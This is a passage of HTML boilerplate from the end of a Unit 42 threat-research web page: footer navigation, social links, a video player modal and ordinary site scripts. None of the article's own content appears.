							<a href="https://www.paloaltonetworks.com/content/pan/en_US/prisma/cloud/cloud-native-application-protection-platform"   role="link" title="Cloud-Native Application Protection Platform" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform:Prisma Cloud:Cloud-Native Application Protection Platform">Cloud-Native Application Protection Platform</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/cortex" target=_blank  role="link" title="AI-Driven Security Operations Platform" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform">AI-Driven Security Operations Platform</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xdr"   role="link" title="Cortex XDR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR">Cortex XDR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsoar"   role="link" title="Cortex XSOAR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR">Cortex XSOAR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse"   role="link" title="Cortex Xpanse" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse">Cortex Xpanse</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsiam"   role="link" title="Cortex XSIAM" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM">Cortex XSIAM</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse/attack-surface-management"   role="link" title="External Attack Surface Protection" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection">External Attack Surface Protection</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/security-operations-automation"   role="link" title="Security Automation" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation">Security Automation</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/detection-and-response"   role="link" title="Threat Prevention, Detection &amp; Response" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation:Threat Prevention, Detection &amp; Response">Threat Prevention, Detection &amp; Response</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/unit42"   role="link" title="Threat Intel and Incident Response Services" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services">Threat Intel and Incident Response Services</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/assess"   role="link" title="Proactive Assessments" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments">Proactive Assessments</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/respond"   role="link" title="Incident Response" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response">Incident Response</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/transform"   role="link" title="Transform Your Security Strategy" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy">Transform Your Security Strategy</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/threat-intelligence-partners"   role="link" title="Discover Threat Intelligence" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy:Discover Threat Intelligence">Discover Threat Intelligence</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Company</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us"   role="link" title="About Us" data-page-track="true" data-page-track-value="footer:Company:About Us">About Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://jobs.paloaltonetworks.com/en/"   role="link" title="Careers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers">Careers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/contact-sales"   role="link" title="Contact Us" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us">Contact Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/corporate-responsibility"   role="link" title="Corporate Responsibility" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility">Corporate Responsibility</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/customers"   role="link" title="Customers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers">Customers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://investors.paloaltonetworks.com/" target=_blank  role="link" title="Investor Relations" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations">Investor Relations</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/locations"   role="link" title="Location" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location">Location</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/newsroom"   role="link" title="Newsroom" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location:Newsroom">Newsroom</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Popular links</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/blog/"   role="link" title="Blog" data-page-track="true" data-page-track-value="footer:Popular links:Blog">Blog</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/communities"   role="link" title="Communities" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities">Communities</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/resources"   role="link" title="Content Library" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library">Content Library</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cyberpedia"   role="link" title="Cyberpedia" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia">Cyberpedia</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://events.paloaltonetworks.com/"   role="link" title="Event Center" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center">Event Center</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://start.paloaltonetworks.com/preference-center"   role="link" title="Manage Email Preferences" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences">Manage Email Preferences</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/products/products-a-z"   role="link" title="Products A-Z" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z">Products A-Z</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/legal-notices/trust-center/tech-certs"   role="link" title="Product Certifications" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications">Product Certifications</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/security-disclosure"   role="link" title="Report a Vulnerability" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability">Report a Vulnerability</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sitemap"   role="link" title="Sitemap" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap">Sitemap</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://docs.paloaltonetworks.com/"   role="link" title="Tech Docs" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs">Tech Docs</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://unit42.paloaltonetworks.com/"   role="link" title="Unit 42" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42">Unit 42</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://panwedd.exterro.net/portal/dsar.htm?target=panwedd" target=_blank  role="link" title="Do Not Sell or Share My Personal Information" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42:Do Not Sell or Share My Personal Information">Do Not Sell or Share My Personal Information</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="footer-bottom"> 
    <div class="l-container"> 
              <div class="footer-logo">
          <a href="https://www.paloaltonetworks.com/" role="link" title="Footer Nav" data-page-track="true" data-page-track-value="footer:logo:Palo Alto Networks">
            <img width="245" height="46" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/palo-alto-footer-logo.svg" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" />          </a>
        </div>
            <div class="footer-bottom__wrapper"> 
        <div class="footer-bottom-nav">
                                              <nav>
                <ul class="footer-menu-nav__list"> 
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/privacy"   role="link" title="Privacy" data-page-track="true" data-page-track-value="footer:bottom-menu:Privacy">Privacy</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/trust-center"   role="link" title="Trust Center" data-page-track="true" data-page-track-value="footer:bottom-menu:Trust Center">Trust Center</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use"   role="link" title="Terms of Use" data-page-track="true" data-page-track-value="footer:bottom-menu:Terms of Use">Terms of Use</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal"   role="link" title="Documents" data-page-track="true" data-page-track-value="footer:bottom-menu:Documents">Documents</a>
                  </li>    
                        
                </ul>
              </nav>
                                            <br/><span class="copyright">Copyright © 2024 Palo Alto Networks. All Rights Reserved</span>
                  </div>
        <div class="footer-bottom-social"> 
          <ul> 
			<li>
			<a href="https://www.youtube.com/user/paloaltonetworks" target="_blank" role="link" title="YouTube" data-page-track="true" data-page-track-value="footer:social:Youtube">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/youtube-black.svg" alt="YouTube">
			</a>
		</li>
				<li> 
			<a href="https://twitter.com/Unit42_Intel" target="_blank" role="link" title="X" data-page-track="true" data-page-track-value="footer:social::Twitter">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/x-icon-black.svg" alt="Twitter">
			</a>
		</li>
				<li> 
			<a href="https://www.facebook.com/PaloAltoNetworks/" target="_blank" role="link" title="Facebook" data-page-track="true" data-page-track-value="footer:social:Facebook">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/Facebook_Icon.svg" alt="Facebook">
			</a>
		</li>
				<li> 
			<a href="https://www.linkedin.com/company/palo-alto-networks" target="_blank" role="link" title="LinkedIn" data-page-track="true" data-page-track-value="footer:social:LinkedIn">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/LinkedIn_Icon.svg" alt="LinkedIn">
			</a>
		</li>
	                <li> 
			<a href="https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/" role="link" title="Podcast" data-page-track="true" data-page-track-value="footer:social:Podcast">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/Podcast.svg" alt="Podcast">
			</a>
		</li>
</ul>          
	<div class="pa language-dropdown">
			<div class="language-dropdown__wrapper"> 
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/globe-icon.svg" alt="Globe icon">
			<span id="selectedLanguage">EN</span>
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"><ul><li class="title">Select your language</li>
					<li class="selected" data-value="en"> 
						<a data-page-track="true" data-page-track-value="footer:language-selector:en" href="https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/">USA (ENGLISH)</a>
					</li></ul>        </div>
      </div>
    </div>
  </div>
</footer>
<div class="dd-overlay">
</div>
<!--  Start: video modal -->
<div class="modal video__modal" id="videoModal" tabindex="-1">
        <div class="modal__video-wrapper">
          <button class="modal__play-btn is-minimized is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
          <button class="modal__minimize-btn is-minimized">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
          </button>
          <button class="modal__close"> 
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button">
          </button>
          <video class="modal__video" id="customVideo">
            <source src="" type="video/mp4">Your browser does not support the video tag.
          </video>
          <div class="modal__post-details" tabindex="-1">       
              <h3>Default Heading</h3>
              <a class="l-btn" href="#" title="Right Arrow Icon" role="link" data-page-track="true" data-page-track-value="overview:explore reports:View all reports">Read the article
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow">
              </a>
          </div>
          <div class="modal__video-controls">
            <div class="modal__video-seekbar input__wrapper"><span></span>
              <label class="is-hidden" for="modalSeekBar">Seekbar</label>
              <input class="custom-range" id="modalSeekBar" type="range" min="0" max="100" value="1">
              <p class="modal__remaining-time"></p>
            </div>
            <button class="modal__play-btn is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
            <div class="modal__volume-controls">
              <div class="modal__volume__wrapper">
                <button tabindex="0">
                  <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-volume.svg" alt="Volume">
                </button>
                <div class="modal__volume-seekbar"><span></span>
                  <label class="is-hidden" for="volumeBar">Volume</label>
                  <input class="volume__bar" id="volumeBar" type="range" min="0" max="1" step="0.1" value="0.7">
                </div>
              </div>
              <button class="modal__minimize-btn" id="minimizeBtn">
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
              </button>
            </div>
          </div>
        </div>
      </div><!--  End: video modal -->

    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		var like_nonce = jQuery('#_wpnonce').val();
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type+"&ul_nonce="+like_nonce,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=6.6.1' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/js/script.js?ver=1.0.0" id="unit42-v6-navigation-js"></script>

<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
const observer_lozad = lozad('.lozad, .lozad-background'); // lazy loads elements with default selector as '.lozad'
observer_lozad.observe();

window.PAN_Clean_Util = {
        isIE: false
};

(function () {
   // INP Util Fix
    function yieldToMain(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
   window.PAN_Clean_Util.yieldToMain = yieldToMain
})();

if(referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
  var Coveo_organizationId = "paloaltonetworksintranet";        
  var techDocsPagePath = "https://docs.paloaltonetworks.com/search.html#hd=All%20Prisma%20Cloud%20Documentation&hq=%40panproductcategory%3D%3D(%22Prisma%20Cloud%22)&sort=relevancy&layout=card&numberOfResults=25";
  var languageFromPath="en_US";
  window.Granite = window.Granite || {};
  Granite.I18n = (function() {
  var self = {};
  self.setLocale = function(locale) { };
  self.get = function(text, snippets, note) {
    var out = "";
    if(text){
      if(text ==="coveo.clear"){
        out = "Clear";
      }else if(text ==="coveo.noresultsfound"){
        out = "No results found for this search term.";
      }
    }
    return out;
  };
  return self
  }());
}

  var main_site_critical_top = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.js';
  var main_site_defered = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/defered.min.js';
  var main_site_criticalTopBase = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopBase.min.js';
  var main_site_criticalTopProductNav = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.js';
window.PAN_MainNavAsyncUrl = maindomain_lang+"/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html";

function loadScript(url, defer){
    var script1 = document.createElement('script');
    script1.setAttribute('type', 'text/javascript');
    script1.setAttribute('src',url);
    if(defer == true){
        script1.setAttribute('defer','defer');
    }
    document.head.appendChild(script1);
}
function loadScript1(url, callback){

    var script = document.createElement("script")
    script.type = "text/javascript";
    if (script.readyState){  //IE
        script.onreadystatechange = function(){
            if (script.readyState == "loaded" || script.readyState == "complete"){
                script.onreadystatechange = null;
                callback();
            }
        };
    } else {  //Others
        script.onload = function(){
            callback();
        };
    }
    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
}
if(referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
	if(referer == "Unit"){
    setTimeout(function(){
      loadScript(main_site_criticalTopBase, false);
      loadScript1(main_site_criticalTopProductNav, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
	else{
    setTimeout(function(){
      loadScript1(main_site_critical_top, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
}

$(document).ready(function () {
    setTimeout(function(){
      $('.article-banner .ab__options ul li a').each(function(){
          	$(this).attr('target', "_blank");
      });
    }, 4000);
});
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->

</body>
</html>
